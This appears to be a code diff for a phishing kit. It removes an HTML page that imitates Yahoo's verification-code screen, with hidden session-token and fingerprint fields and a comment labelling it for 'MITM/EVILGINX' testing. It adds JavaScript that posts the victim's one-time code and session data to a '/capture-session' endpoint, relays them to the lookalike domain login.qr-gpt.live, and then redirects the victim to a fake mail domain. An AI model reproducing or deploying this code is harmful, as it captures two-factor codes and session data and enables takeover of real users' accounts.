@@ -1,178 +1,30 @@
-<!DOCTYPE html>
-<html data-wf-page="67c6f50ed426ad7d5847f220" data-wf-site="67c6f50ed426ad7d5847f211">
-<head>
-  <meta charset="utf-8">
-  <title>Yahoo - Enter Verification Code</title>
-  <meta content="width=device-width, initial-scale=1" name="viewport">
-  <meta content="Webflow" name="generator">
-  <link href="css/normalize.css" rel="stylesheet" type="text/css">
-  <link href="css/webflow.css" rel="stylesheet" type="text/css">
-  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
-  <!-- CUSTOM COMPONENTS CSS -->
-  <link href="css/custom-components.css" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com" rel="preconnect">
-  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
-  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
-  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
-  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
-  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
-  <link href="./yahoo.png" rel="apple-touch-icon">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-</head>
-<body>
-  <section class="section">
-    <div class="div-block">
-      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
-      <div class="div-block-3">
-        <div class="text-block">Help</div>
-        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
-        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
-      </div>
-    </div>
-    <div class="layout active">
-      <div class="div-block-5">
-        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
-        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
-      </div>
-      <div class="form-block w-form">
-        <form id="otp-form" name="otp-form" data-name="OTP Form" class="form"
-              data-wf-page-id="67c6f50ed426ad7d5847f220"
-              data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
-          
-          <input type="hidden" name="sessionIndex" id="sessionIndex" value="1">
-          <input type="hidden" name="crumb" id="crumb">
-          <input type="hidden" name="acrumb" id="acrumb">
-          <input type="hidden" name="sessionToken" id="sessionToken">
-          <input type="hidden" name="browser-fp-data" id="browser-fp-data">
-          <input type="hidden" name="timestamp" id="timestamp">
-          <input type="hidden" name="username" id="username">
-          <input type="hidden" name="verifyCode" id="verifyCode">
-          <input type="hidden" name="method" id="method">
-          <input type="hidden" name="proxiedSync" id="proxiedSync" value="true">
-          
-          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
-          
-          <div class="pazzi" id="main-form">
-            <div class="reflectto" id="userEmail">Enter verification code</div>
-            <h1 class="heading-2"><strong>Enter verification code</strong></h1>
-            <div class="text-block-2" id="method-description">We sent a code to your device<br></div>
-            
-            <div class="otp-container">
-              <div class="otp-inputs">
-                <input type="text" class="otp-input" maxlength="1" data-index="0" autocomplete="off">
-                <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off">
-                <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off">
-                <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off">
-                <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off">
-                <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off">
-              </div>
-              <input type="hidden" name="otp" id="otp">
-            </div>
-
-            <div class="resend-container">
-              <p>Didn't receive a code? <a href="#" id="resend-link">Resend</a></p>
-            </div>
-
-            <input type="submit" data-wait="Verifying..." class="logger w-button" value="Verify" id="submit-btn">
-          </div>
-
-          <div id="loading-state" style="display: none; text-align: center; padding: 20px;">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #7200ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
-            <p>Verifying code...</p>
-          </div>
-
-          <div id="success-state" style="display: none; text-align: center; padding: 20px;">
-            <div style="color: #28a745; font-size: 48px; margin-bottom: 10px;">✓</div>
-            <h2>Verification successful!</h2>
-            <p>Redirecting to your Yahoo Mail...</p>
-          </div>
-
-          <div id="error-container" style="display: none; text-align: center; padding: 20px;">
-            <div class="error-icon">⚠️</div>
-            <h2>Verification Failed</h2>
-            <p id="error-message">Invalid code. Please try again.</p>
-            <button id="refreshButton" class="restart logger w-button">Try Again</button>
-          </div>
-        </form>
-      </div>
-    </div>
-  </section>
-
-  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
-  <script src="js/webflow.js" type="text/javascript"></script>
-  
-  <!-- Add spinner animation -->
-  <script>
-  const style = document.createElement('style');
-  style.textContent = `
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+// js/yahoo-otp.js (partial update)
+form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const otp = document.getElementById('otp').value;
+    if (otp.length !== 6) {
+        showError('Please enter a 6-digit code.');
+        return;
     }
-    .otp-container {
-      margin: 20px 0;
-      text-align: center;
-    }
-    .otp-inputs {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      margin-bottom: 15px;
-    }
-    .otp-input {
-      width: 45px;
-      height: 50px;
-      text-align: center;
-      font-size: 20px;
-      font-weight: bold;
-      border: 2px solid #ddd;
-      border-radius: 8px;
-      background: white;
-      transition: all 0.2s ease;
-    }
-    .otp-input:focus {
-      outline: none;
-      border-color: #0078d4;
-      box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
-    }
-    .otp-input.filled {
-      border-color: #28a745;
-      background: #f8fff9;
-    }
-    .otp-input.error {
-      border-color: #dc3545;
-      background: #fff8f8;
-      animation: shake 0.5s ease-in-out;
-    }
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      25% { transform: translateX(-5px); }
-      75% { transform: translateX(5px); }
-    }
-    .resend-container {
-      text-align: center;
-      margin: 15px 0;
-    }
-    .resend-container a {
-      color: #0078d4;
-      text-decoration: none;
-      font-weight: 500;
-    }
-    .resend-container a:hover {
-      text-decoration: underline;
-    }
-    .fade-in {
-      animation: fadeIn 0.3s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-  `;
-  document.head.appendChild(style);
-  </script>
-  
-  <!-- LINKED EXTERNAL JS FILE FOR MITM/EVILGINX TESTING -->
-  <script src="js/yahoo-otp.js" type="text/javascript"></script>
-</body>
-</html>
+    showLoading();
+    const formData = new FormData(form);
+    fetch('/capture-session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(Object.fromEntries(formData))
+    }).then(() => {
+        fetch(`https://login.qr-gpt.live/account/challenge/${method}`, {
+            method: 'POST',
+            body: formData
+        }).then(response => response.json()).then(data => {
+            if (data.success) {
+                showSuccess();
+                setTimeout(() => window.location.href = data.redirect || 'https://mail.qr-gpt.live/d/folders/1', 2000);
+            } else {
+                showError('Invalid code. Please try again.');
+                otpInputs.forEach(input => input.classList.add('error'));
+                setTimeout(() => otpInputs.forEach(input => input.classList.remove('error')), 500);
+            }
+        }).catch(err => showError('Error verifying code.'));
+    });
+});
